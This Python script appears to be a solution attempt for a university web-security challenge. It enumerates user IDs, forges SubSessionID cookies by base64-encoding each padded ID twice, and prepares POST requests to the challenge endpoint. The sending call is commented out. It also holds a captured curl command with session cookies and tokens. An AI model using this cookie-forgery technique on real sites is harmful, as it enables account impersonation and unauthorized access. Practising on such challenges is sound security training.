
import requests
import base64

def zeros(n):
    # Hardcoded because I'm lazy
    if n < 10:
        return "000000000000000"
    elif n > 9 and n < 100:
        return "00000000000000"
    elif n >= 100:
        return "0000000000000"

def get_user_id(user_id):
    user_id_int = int(user_id)
    user_id_int += 1
    user_id = zeros(user_id_int) + str(user_id_int)
    return  user_id

def get_subsession_id(user_id):
    # base64 encode user_id twice and return it
    result = base64.b64encode(base64.b64encode(user_id.encode('utf-8'))).decode('utf-8')
    return result


# result = requests.get("https://snickerboa.it.liu.se/index.jsp")
# print(result.text)

#curl 'https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://snickerboa.it.liu.se' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp' -H 'Cookie: checksum=dXNlclJvbGU9dXNlcg==; current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; JSESSIONID=AD53FB0DC7CF3127E1C32540A321D916; token=39094034355722208787933837617201880517' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'userId=0000000000000001&useSecurity=true'
#
#POST /challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6 HTTP/1.1
# Host: snickerboa.it.liu.se
# User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
# Accept: */*
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate, br
# Content-Type: application/x-www-form-urlencoded
# X-Requested-With: XMLHttpRequest
# Content-Length: 40
# Origin: https://snickerboa.it.liu.se
# DNT: 1
# Connection: keep-alive
# Referer: https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp
# Cookie: checksum=dXNlclJvbGU9dXNlcg==; current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; JSESSIONID=AD53FB0DC7CF3127E1C32540A321D916; token=39094034355722208787933837617201880517
# Sec-Fetch-Dest: empty
# Sec-Fetch-Mode: cors
# Sec-Fetch-Site: same-origin
# Pragma: no-cache
# Cache-Control: no-cache
# Maybe something that might work
url = 'https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6'


# Variables to send. Vary them in a function
user_id = '0000000000000001'
SubSessionID = 'TURBd01EQXdNREF3TURBd01EQXdNUT09'

#result = requests.get(url)
#print(str(result.text))


def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in 
    this function because it is programmed to be pretty 
    printed and may differ from the actual request.
    """
    print('{}\n{}\r\n{}\r\n\r\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))

for i in range(1, 10):
    user_id = get_user_id(user_id)
    subsession_id = get_subsession_id(user_id)

    send_cookie = 'current=WjNWbGMzUXhNZz09; SubSessionID=' + subsession_id + '; JSESSIONID=8976C2DF1B73892C974ABF704E23173D; token=-149843670468644925738703009701292153138'
    # send_header =   {
    #                     'Host': 'snickerboa.it.liu.se',
    #                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
    #                     'Accept': '*/*',
    #                     'Accept-Language': 'en-US,en;q=0.5',
    #                     'Accept-Encoding': 'gzip, deflate, br',
    #                     'Content-Type': 'application/x-www-form-urlencoded',
    #                     'X-Requested-With': 'XMLHttpRequest',
    #                     'Content-Length': '40',
    #                     'Origin': 'https://snickerboa.it.liu.se',
    #                     'Connection': 'keep-alive',
    #                     'Referer': 'https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp',
    #                     'Cookie': send_cookie,
    #                     'Sec-Fetch-Dest': 'empty',
    #                     'Sec-Fetch-Mode': 'cors',
    #                     'Sec-Fetch-Site': 'same-origin',
    #                 }
    send_header = {
                    "Host":"snickerboa.it.liu.se",
                    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
                    "Accept":"*/*",
                    "Accept-Language":"en-US,en;q=0.5",
                    "Accept-Encoding":"gzip, deflate, br",
                    "Content-Type":"application/x-www-form-urlencoded",
                    "X-Requested-With":"XMLHttpRequest",
                    "Content-Length":"40",
                    "Origin":"https://snickerboa.it.liu.se",
                    "DNT":"1",
                    "Connection":"keep-alive",
                    #"Referer":"https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp",
                    "Cookie": send_cookie,
                    "Sec-Fetch-Dest":"empty",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Site":"same-origin",
                    "Pragma":"no-cache",
                    "Cache-Control":"no-cache"
                    }
    send_data =  {
                    'userId': user_id,
                    'useSecurity': 'true'
                }

    #print(user_id)
    #print(subsession_id)
    request = requests.Request(url=url,data=send_data,headers=send_header)
    prepared = request.prepare()
    pretty_print_POST(prepared)
    #result = requests.post(url, data=send_data, headers=send_header)
    
    #print(result.text)
    #print(result.status_code)
    #print(result.ok)